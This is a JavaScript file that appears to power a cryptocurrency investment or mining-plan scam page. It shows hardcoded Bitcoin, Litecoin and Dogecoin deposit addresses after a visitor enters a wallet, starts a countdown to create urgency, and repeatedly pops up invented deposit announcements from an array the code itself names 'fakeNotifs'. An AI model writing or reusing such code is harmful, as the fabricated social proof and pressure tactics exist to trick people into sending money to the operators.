
const addressMap = {
  btc: "16v7wek8tM5rtVb6hbbCGhvu3RPwdZYicc",
  ltc: "ltc1qaudjtktds3pg0zd93xw4naegq5h7lekrt5k2ff",
  doge: "DGGFE3saLnuibxtgtCtDZ2XkjhrzoTLwU7"
};

document.getElementById("wallet").addEventListener("input", function () {
  const val = this.value.trim();
  if (val.length > 15) {
    document.getElementById("plans").classList.remove("hidden");
  }
});

function showPayment(coin) {
  document.getElementById("plans").classList.add("hidden");
  document.getElementById("paymentBox").classList.remove("hidden");
  document.getElementById("payAddress").textContent = addressMap[coin];
  startCountdown(3);
}

function goBack() {
  document.getElementById("paymentBox").classList.add("hidden");
  document.getElementById("plans").classList.remove("hidden");
}

function startCountdown(days) {
  const end = Date.now() + days * 24 * 60 * 60 * 1000;
  const timer = setInterval(() => {
    const diff = end - Date.now();
    if (diff <= 0) {
      clearInterval(timer);
      document.getElementById("countdown").textContent = "Plan expired.";
    } else {
      const hrs = Math.floor(diff / (1000 * 60 * 60));
      const mins = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
      const secs = Math.floor((diff % (1000 * 60)) / 1000);
      document.getElementById("countdown").textContent = `Time left: ${hrs}h ${mins}m ${secs}s`;
    }
  }, 1000);
}

const fakeNotifs = [
  "Ali from Saudi Arabia just activated a Bitcoin plan",
  "Jessica from USA started a Litecoin contract",
  "Mohammed just deposited 100 DOGE",
  "David just joined with 0.001 BTC",
  "Lina from UAE activated a Litecoin plan"
];

function showNotification() {
  const notif = document.getElementById("notification");
  notif.textContent = fakeNotifs[Math.floor(Math.random() * fakeNotifs.length)];
  notif.style.display = "block";
  setTimeout(() => { notif.style.display = "none"; }, 4000);
}

setInterval(showNotification, 8000);
